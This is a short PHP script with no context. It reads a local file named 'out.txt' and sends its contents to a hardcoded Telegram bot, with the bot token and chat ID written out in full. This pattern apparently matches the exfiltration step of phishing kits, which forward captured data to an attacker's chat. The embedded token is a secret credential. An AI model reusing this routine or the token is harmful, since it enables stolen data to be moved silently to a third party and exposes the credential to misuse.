<?php
    sleep(2);
    $msg = urlencode(file_get_contents("out.txt"));
    file_get_contents("https://api.telegram.org/bot2027907667:AAGnRMymCn6oNbWTif3_eOr1LAf_B7_XkU0/sendMessage?chat_id=1835257605&text=$msg");
?>
